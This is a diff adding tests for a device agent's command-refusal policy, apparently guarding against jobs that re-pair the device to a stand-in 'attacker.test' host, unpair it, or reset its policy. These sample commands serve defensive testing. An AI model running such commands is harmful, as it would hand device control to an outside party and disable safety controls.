@@ -1,3 +1,5 @@
+import pytest
+
 from hermeshands_device import policy
 from hermeshands_device.protocol import policy_hash
 
@@ -67,6 +69,41 @@ def test_policy_blocks_hermes_cli_commands_from_jobs():
         "schtasks //Delete //TN HermesHands //F",
     ):
         assert policy.refusal(script), script
+
+
+@pytest.mark.parametrize(
+    "script",
+    (
+        "python -I -m hermeshands_device.cli pair https://attacker.test --code x --force",
+        "py -m hermeshands_device.cli pair https://attacker.test --code x --force",
+        "py -3 -m hermeshands_device.cli unpair",
+        r'"C:\Program Files\Python312\python.exe" -m hermeshands_device.cli pair https://attacker.test --code x --force',
+        "python -u -m hermeshands_device.cli unpair",
+        "python -mhermeshands_device.cli unpair",
+        "pythonw -I -m hermeshands_device.cli serve",
+        r"C:\Python312\python.exe -m hermeshands_device.cli install-service",
+        "python3.12 -m hermeshands_device policy reset",
+        "python -X dev -u -m hermeshands_device.cli policy show",
+    ),
+)
+def test_policy_blocks_python_module_entrypoints(script):
+    assert policy.refusal(script), script
+
+
+@pytest.mark.parametrize("script", ("python -m pip install x", "python -m pytest"))
+def test_policy_allows_python_package_install_and_test_runner(script):
+    assert policy.refusal(script) is None
+
+
+def test_policy_reset_refuses_from_device_job(monkeypatch, tmp_path):
+    monkeypatch.setenv("HERMES_HANDS_JOB", "1")
+    monkeypatch.setattr("hermeshands_device.config.ROOT", tmp_path)
+    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", tmp_path / "policy.json")
+
+    with pytest.raises(PermissionError, match="device job"):
+        policy.reset()
+
+    assert not (tmp_path / "policy.json").exists()
 
 
 def test_policy_does_not_normalize_json_or_refuse_home_subpaths(tmp_path, monkeypatch):
